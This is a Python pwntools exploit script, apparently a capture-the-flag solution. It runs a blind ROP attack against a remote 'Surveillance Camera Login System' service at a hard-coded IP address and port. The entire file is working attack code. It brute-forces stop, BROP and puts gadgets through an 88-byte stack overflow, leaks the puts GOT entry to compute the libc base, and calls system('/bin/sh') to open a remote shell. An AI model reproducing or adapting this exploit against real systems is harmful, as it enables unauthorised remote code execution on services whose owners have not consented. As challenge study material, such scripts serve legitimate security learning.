#!/usr/bin/env python3
from pwn import *

ip = '34.159.129.6'
port = 30550

# set libc for Pwntools
libc = ELF('libc-2.23.so')

context.log_level = 'error'


def find_loop_gadget(i):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    addr_guess = i + 0x4005bf

    payload = b'A'*88
    payload += p64(addr_guess)

    ru(b'Are you blind my friend?\n')
    s(payload)

    try:
        check = rl()
        if b'Are you blind my friend?\n' in check:
            return int(addr_guess)
        else:
            print(check)
            print(rl())
            r.close()
    except:
        print(sys.exc_info()[0])
        print(i)
        r.close()


def find_brop_gadget(i):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    # adjusted this cause before 0x401400 there are some false TRUE results
    addr_guess = i + 0x4007b0

    payload = b'A'*88
    payload += p64(addr_guess)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(0x00)
    payload += p64(loop)

    ru(b'Are you blind my friend?\n')
    s(payload)

    try:
        check = rl()
        if b'Are you blind my friend?\n' in check:
            try:
                p = remote(ip, port, timeout=1)

                payload = b'A'*88
                payload += p64(addr_guess)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                payload += p64(0x00)
                # one extra to crash it if it still prints `---- Surveillance Camera Login System v2 ----\n` its the wrong guess addr
                payload += p64(0x00)

                p.send(payload)

                check2 = rl()
                if check2:
                    print('not passed check2')
                    p.close()
                    r.close()
                else:
                    print('passed check2')
                    r.close()
                    p.close()
                    return addr_guess

            except:
                r.close()
                p.close()
                print(sys.exc_info()[0])
                print(f'{hex(addr_guess)} failed')
        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        r.close()


def find_puts_gadget(i):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    addr_guess = i*0x10 + 0x400200

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(0x400000)  # should print out 'ELF' at this addr
    payload += p64(addr_guess)

    s(payload)
    ru('Are you blind my friend?\n')

    try:
        check = rl()
        if b'ELF' in check:
            r.close()
            return addr_guess
        else:
            print(check)
    except:
        print(sys.exc_info()[0])
        print(i)
        r.close()


def find_strcmp(i):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    test = i*0x10 + 0x400200

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(0x400000)
    payload += p64(pop_rsi_r15)
    payload += p64(0x400000)
    payload += p64(0x400000)
    payload += p64(test)
    payload += p64(loop)
    ru('Are you blind my friend?\n')
    s(payload)

    try:
        check = rl()
        if b'Are you blind my friend?\n' in check:
            r.close()
            print('\n1st check passed good:good')

            print(f'2nd check for {hex(test)} good:bad')
            p = remote(ip, port, timeout=1)

            payload = b'A'*88
            payload += p64(pop_rdi)
            payload += p64(0x400000)
            payload += p64(pop_rsi_r15)
            payload += p64(0x0)
            payload += p64(0x0)
            payload += p64(test)
            payload += p64(loop)
            p.readuntil('Are you blind my friend?\n')
            p.send(payload)

            try:
                check2 = rl()

                if check2:
                    print('not passed check2')
                    p.close()
                else:
                    print('not passed check2')
                    p.close()

            except:
                r.close()
                p.close()
                print(f'3nd check for {hex(test)} bad:good')
                p = remote(ip, port, timeout=1)

                payload = b'A'*88
                payload += p64(pop_rdi)
                payload += p64(0x0)
                payload += p64(pop_rsi_r15)
                payload += p64(0x400000)
                payload += p64(0x0)
                payload += p64(test)
                payload += p64(loop)
                p.readuntil('Are you blind my friend?\n')
                p.send(payload)

                try:
                    check3 = rl()

                    if check3:
                        print('not passed check3')
                        p.close()
                    else:
                        print('not passed check3')
                        p.close()

                except:
                    p.close()
                    print(f'4rd check for {hex(test)} bad:bad')
                    p = remote(ip, port, timeout=1)

                    payload = b'A'*88
                    payload += p64(pop_rdi)
                    payload += p64(0x0)
                    payload += p64(pop_rsi_r15)
                    payload += p64(0x0)
                    payload += p64(0x0)
                    payload += p64(test)
                    payload += p64(loop)
                    p.readuntil('Are you blind my friend?\n')
                    p.send(payload)
                    try:
                        check4 = rl()

                        if check4:
                            print('not passed check4')
                            p.close()

                        else:
                            print('not passed check4')
                            p.close()

                    except:
                        p.close()
                        print(sys.exc_info()[0])
                        return test

        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        print(hex(test))
        r.close()


def leak(i):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(i)
    payload += p64(puts)

    s(payload)
    rl()
    leak = unpack(rl()[:-1], 'all')
    return leak


def leak_binary(i, j):

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    x = i + j

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(x)
    payload += p64(puts)

    s(payload)

    rl()
    try:
        check = rl()
        if check:
            if check.hex()[:-2] == '':
                file.append(b'\x00')
                r.close()
                return int(offset) + 1

            else:
                file.append(check[:-1])
                last_len = int(len(check)-1)
                r.close()
                return int(offset) + int(last_len)

        else:
            r.close()
    except:
        print(sys.exc_info()[0])
        r.close()
        return int(offset + 1)


def pwn():

    #context.log_level = 'debug'

    r = remote(ip, port, timeout=1)

    def rb(x): return r.recvb(x)
    def rl(): return r.recvline()
    def ru(x): return r.recvuntil(x)
    def rlub(x): return r.recvuntilb(x)
    def s(x): return r.send(x)
    def sl(x): return r.sendline(x)
    def sla(x, y): return r.sendlineafter(x, y)
    def inter(): return r.interactive()

    pop_rdi = pop_rdi = int(brop) + 0x9
    ret = int(brop) + 10
    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(putsgot)
    payload += p64(puts+0x10)
    payload += p64(loop)
    print(payload)
    print(hex(pop_rdi))
    print(hex(putsgot))
    print(hex(puts+0x10))
    print(hex(loop))

    ru('Are you blind my friend?\n')
    s(payload)

    leak = unpack(rl()[:-1], 'all')
    print(hex(leak))
    libc.address = leak - libc.symbols['puts']

    print(hex(libc.address))

    ru('Are you blind my friend?\n')

    binsh = next(libc.search(b'/bin/sh\x00'))
    execve = libc.symbols['execve']
    system = libc.symbols['system']

    payload = b'A'*88
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)

    s(payload)

    inter()


if __name__ == '__main__':

    for i in range(0x2000):
        loop = find_loop_gadget(i)
        if loop:
            print(f'found loop_gadget @ {hex(loop)}')
            break

    print('now searching for brop_gadget')

    for i in range(0x2000):
        brop = find_brop_gadget(i)
        if brop:
            print(f'found brop_gadget @ {hex(brop)}')
            break

    pop_rdi = int(brop) + 0x9
    pop_rsi_r15 = int(brop) + 0x7

    # maybe printf will be a false true it works for most things but care when something crashes it could be this
    print('now searching for puts')

    for i in range(0x50):
        puts = find_puts_gadget(i)
        if puts:
            print(f'found puts @ {hex(puts)}')
            break

    # print('now searching for strcmp')
    # for i in range(0x50):
    #     strcmp = find_strcmp(i)
    #     if strcmp:
    #         print(f'found strcmp @ {hex(strcmp)}')
    #         break

    puts_check = hex(libc.symbols['puts'])[-2::]

    for i in range(0x10):
        # found 0x601060 using 0x601000 cause page start allways scan full ranges
        check = leak(0x601000+i*8)
        print(f'{hex(0x601000+i*8)} : {hex(check)}')
        if hex(check)[12:] == puts_check:
            putsgot = (i*8+0x601000)
            print(f'puts_got @ {hex(putsgot)}')
            break

    # file = []
    # last_len = 0
    # offset = 0

    # for i in range(0xb00):
    #     offset = leak_binary(offset,0x400000)
    #     print(offset)
    #     print(f'{hex(i)}')

    # string1 = b''.join(file)

    # with open('binary_dump', 'wb') as out:
    #     out.write(string1)
    #     out.close()

    pwn()  # pops a shell
